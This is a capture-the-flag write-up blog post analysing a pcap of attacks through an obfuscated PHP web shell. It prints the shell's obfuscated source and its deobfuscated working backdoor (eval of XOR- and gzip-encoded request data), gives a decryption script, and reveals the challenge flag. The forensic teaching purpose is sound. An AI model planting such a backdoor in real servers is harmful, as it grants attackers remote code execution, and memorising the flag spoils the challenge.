---
layout: post
title: OpenECSC - Shellcode
date: 2022-03-21 15:51 +0200
author: Danique
tags: ctf openecsc pwn
categories: [CTF, Binary Exploitation]
---
Medium challenge in the OpenECSC online environment, round 1, on HackingLab. Solved on 21-3-2022

## Description: 
You have to investigate recent attack on your web server.
Since attackers were very skilled, they used specially designed PHP shell to access the server.
Your friends from Incident Response Department managed to get network capture file with malicious traffic containing the secret flag. 

Goal: Find the secret flag in the pcap

## Solution
Looking through the shellcode we can see that it contains some interesting strings which are later used and decoded:

```
$W='@e5@va5@l(@gzuncompre5@ss(5@@x(@base65@4_d5@ecode(5@$m[15@]),$5@k)));5@$o=@5@ob_5@get_contents();';

$E='$k5@="465@96bd5@9a";$5@kh="8ecf79155df0";5@$kf5@="5fb5@97fdc5@8317";$p=5@5@"BL450m5@5@L15@WeCi5@9eMA";';
 
$T='0;5@($j<5@$5@c&&$i<$l);$5@5@j++,$i5@++){$o.=$t{$i}5@5@^$k{$j};}5@}ret5@urn $5@o;}i5@f (@preg_ma5@';
$D=str_replace('bQ','','cbQreatbQe_bQfubQncbQtibQon');

$h='function x(5@$t,$5@k){$c=strle5@n($k);$l=st5@rlen(5@$t);$5@o="";fo5@r(5@$i=0;$5@i<$l;)5@{for($j=';

$l='tch(5@"/$k5@h(.+)$5@k5@f/"5@,@file_get5@_contents("php://i5@5@nput5@"),5@$m)==15@)5@ {@ob_start();';

$X='@ob_e5@nd5@_cle5@an()5@;$r=@base65@4_encode(5@@x(@gzco5@mpress(5@$5@o),5@$k));prin5@t("$p$kh5@$r$kf");}';

$G=str_replace('5@','',$E.$h.$T.$l.$W.$X);
$i=$D('',$G);
$i();
```
There are some str_replaces so we try to use the php interactive shell ` php -a ` to run this and to find out what the values of `$G` and `$I` are.

$G:
```
$k="4696bd9a";$kh="8ecf79155df0";$kf="5fb97fdc8317";$p="BL450mL1WeCi9eMA";function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");}
```

$i:
```
$D('',$G); = create_function('', $G);
```
create_function returns the unique function name of the function just created, so when we call ```$i();```, we execute the code specified in $G.

What is the code in $G?
```
$k="4696bd9a";
$kh="8ecf79155df0";
$kf="5fb97fdc8317";
$p="BL450mL1WeCi9eMA";
function x($t,$k){
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;){
		for($j=0;($j<$c&&$i<$l);$j++,$i++){
			$o.=$t{$i}^$k{$j};
		}
	}
	return $o;
}
	
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
	@ob_start();
	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));		
	$o=@ob_get_contents();
	@ob_end_clean();
	$r=@base64_encode(@x(@gzcompress($o),$k));
	print("$p$kh$r$kf");
}

```
php://input is a read-only stream that allows us to read raw data from the request body. It returns all the raw data after the HTTP headers of the request, regardless of the content type. 

### Finding PCAP packets
We see that the output of the shell code is in the shape of \\$p\\$kh\\$r\\$kf, where \\$r is the only unkown. So we can search in the .pcap file if we find packets which contain the string \\$p\\$kh. 
Which gives us 12 packets:

All:
```
BL450mL1WeCi9eMA8ecf79155df0TKoKB9FUjWE0NRo3bg==5fb97fdc8317\n

BL450mL1WeCi9eMA8ecf79155df0TKoKAlRWD4E2NjrAY2A=5fb97fdc8317\n

BL450mL1WeCi9eMA8ecf79155df0TKrqGSlI604bGe75Sq30gDY2Hx9mnw==5fb97fdc8317\n

BL450mL1WeCi9eMA8ecf79155df0TKq8Yqv2olEki8IdHiiTjSYAZ0OuQa4tOqU2fmvA+LW0ch3GkJPQZAQfDa/wxEMYyeLToIb5UoRpEAkK6ObGOF1zn/QHxazIqTP9MCTLsU9MJznE9uBM9B98gnaJOVcApAk3PO1kmXUyfHutCXBdEnTb3VfdK07zYAepPDZzvMs5BNTTQ/WVcftyxbHQMqG9dViPJC
 
BL450mL1WeCi9eMA8ecf79155df0TKoKBVVUCmc0NSc3ZQ==5fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKoKAlBSDIM2NjrJY2w=5fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKpM+aNpulE4M+lNxJwypb51GRIhED5L7rStAErWc6dbZzazYbauLtvti1J7diPK8oTvlNWkm4UYiThRIONyH7c74XGJJEK6qGwu7+Es0NPelI62lZzynoy9VL0ZfidFYfgTWmCT/pzHXYVj+ICgL9vOWc2BZ1DfBhvqlFyAiyZ25fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKqKBlJWiWE0NTI3YQ==5fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKoKAlNQDYU2NjrFY2c=5fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKoy/yoxcap9em7+TtJrKX8EDYcqKo1VfgeIBlNUDikGAwgHKVYPUwJ4dHtRUA6ANjYH0m795fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKoKAlFWC2M0NMc2nA==5fb97fdc8317\n
 
BL450mL1WeCi9eMA8ecf79155df0TKq8Yqv2olEki8IdHiiTjSYAZ0OuQa4tOqU2fmvA+LW0ch3GkJPQZAQfDa/wxEMYyeLToIb5UoRpEAkK6ObGOF1zn/QHxazIqTP9MCTLsU9MJznE9uBM9B98gnaJOVcApAk3PO1kmXUyfHutCXBdEnTb3VfdK07zYAepPDZzvMs5BNTTQ/WVcftyxbHQMqG9dViPJC
``` 
Now we can write a piece of code that reverses the operations in the php shell code: 
We first need to only get the \\$r piece of the message, then base64_decode it, unxor it (which the function x can do, as it is invertible) and then guncompress. Which then gives us the decrypted message. Message 11 gives us the flag:

### Decryption

We decrypt all the packets with the following script. All the 12 packet texts are in the textarray array, we then use the x function from the code and the following decrypt php code to decrypt: 
```
foreach($textarray as $text) {
		# Filter away the text that we do not need.
		$text2 = str_replace([$p,$kf,$kh] , "", $text);
		
		# Next, decode the text with base64:
		$decodedtext = @base64_decode($text2);
		#print $decodedtext;
		
		# UNXOR:
		$o = @x($decodedtext, $k);
		#print $o;
		
		#Gunzip:
		$oo = @gzuncompress($o);
		print $oo . "\n";
	}
```

Where we can find the flag text in message 11: 
The flag is: fb148ca92d484070b5446b3233eef174
